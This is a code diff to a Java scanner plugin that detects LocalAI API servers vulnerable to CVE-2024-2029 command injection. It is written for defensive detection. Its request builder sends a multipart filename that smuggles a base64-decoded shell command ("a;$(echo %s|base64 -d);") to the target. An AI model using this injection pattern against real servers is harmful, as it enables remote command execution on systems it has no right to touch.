@@ -66,12 +66,8 @@ import javax.inject.Inject;
 /** A {@link VulnDetector} that detects exposed LocalAI API server. */
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
-
-    // name of the plugin
     name = "ExposedLocalAIDetector",
     version = "0.1",
-
-    // detailed description of the plugin
     description =
         "This plugin detects exposed LocalAI API serve that vulnerable to cve-2024-2029."
             + "this CVE allows attacker to inject arbitrary OS commands "
@@ -92,7 +88,7 @@ public final class LocalAiCve20242029RceDetector implements VulnDetector {
       @UtcClock Clock utcClock,
       PayloadGenerator payloadGenerator,
       @OobSleepDuration int oobSleepDuration) {
-    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(true).build();
+    this.httpClient = checkNotNull(httpClient);
     this.utcClock = checkNotNull(utcClock);
     this.payloadGenerator = checkNotNull(payloadGenerator);
     this.oobSleepDuration = oobSleepDuration;
@@ -158,8 +154,7 @@ public final class LocalAiCve20242029RceDetector implements VulnDetector {
                       + " filename=\"a;$(echo %s|base64 -d);\"\r\n\r\n",
                   BaseEncoding.base64().encode(payload.getPayload().getBytes(UTF_8)))
               .getBytes(UTF_8));
-      output.write(
-          Resources.toByteArray(Resources.getResource(this.getClass(), "simpleAudio.ogg")));
+      output.write("".getBytes(UTF_8)); // empty file
       output.write("\r\n".getBytes(UTF_8));
       output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3\r\n".getBytes(UTF_8));
       output.write("Content-Disposition: form-data; name=\"model\"\r\n\r\n".getBytes(UTF_8));
